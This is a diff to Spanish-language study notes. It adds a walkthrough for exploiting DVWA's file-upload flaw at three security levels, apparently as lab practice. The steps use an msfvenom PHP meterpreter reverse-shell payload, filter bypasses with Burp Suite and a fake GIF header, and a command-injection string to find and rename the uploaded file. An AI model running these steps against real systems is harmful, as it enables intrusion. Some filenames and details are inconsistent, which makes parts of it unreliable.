@@ -321,13 +321,42 @@ Aplicación para aprender lenguajes: SoloLearn para móviles.
  -----------
  Vamos a utilizar esta vulnerabilidad para subir un archivo que nos permita obtener un shell inversa.
  
+ Nivel Low
+ ---------
  Para ello los pasos a seguir son los siguientes:
  1. Creamos un troyano con msfvenom de la siguiente manera:
    - msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > troyano.php
- 2. 
+ 2. Subimos el archivo.
+ 3. Ponemos la escucha en metasploit con el multi/handler y le damos las características que hemos indicado en la creación del payload.
+ 4. Accedemos al archivo a través de la página web y se nos creará una sesión de meterpreter en metasploit.
+ 5. Obtendremos la flag.
  
+ Nivel Medium
+ ------------
+ Para ello los pasos a seguir son los siguientes:
+ 1. Creamos un troyano con msfvenom de la siguiente manera:
+   - msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > troyano.php
+ 2. Modificamos el nombre del archivo a troyano.php.jpg.
+ 3. Abrimos Burpsuite y lo ponemos a interceptar.
+ 4. Configuramos Firefox para que use Burpsuite como proxy.
+ 5. Interceptamos la petición de subida del fichero y midifcamos el nombre del fichero a troyano.php para que lo podamos ejecutar una vez subido.
+ 6. Ponemos la escucha en metasploit con el multi/handler y le damos las características que hemos indicado en la creación del payload.
+ 7. Accedemos al archivo a través de la página web y se nos creará una sesión de meterpreter en metasploit.
+ 8. Obtendremos la flag.
 
- 
+ Nivel High
+ ------------
+ Para ello los pasos a seguir son los siguientes:
+ 1. Creamos un troyano con msfvenom de la siguiente manera:
+   - msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > troyano.php
+ 2. Modificamos el archivo y le añademod el encabezado GIF98 en la primera línea y le cambiamos el nombre a troyano.jpg.
+ 3. Subimos el archivo.
+ 4. Ponemos la escucha en metasploit con el multi/handler y le damos las características que hemos indicado en la creación del payload.
+ 5. Buscamos el fichero para poder modificar la extensión con el comando: '|| dir c:\ /s | findstr "shell.jpg"'
+ 6. La ruta en la que está es c:\wamp64\www\DVWA\hackable\uploads\shell.jpg.
+ 7. Para modificar el nombre usamos el comando: copy c:\wamp64\www\DVWA\hackable\uploads\shell.jpg c:\wamp64\www\DVWA\hackable\uploads\shell.php
+ 8. Accedemos al archivo a través de la página web y se nos creará una sesión de meterpreter en metasploit.
+ 9. Obtendremos la flag.
  
  
   
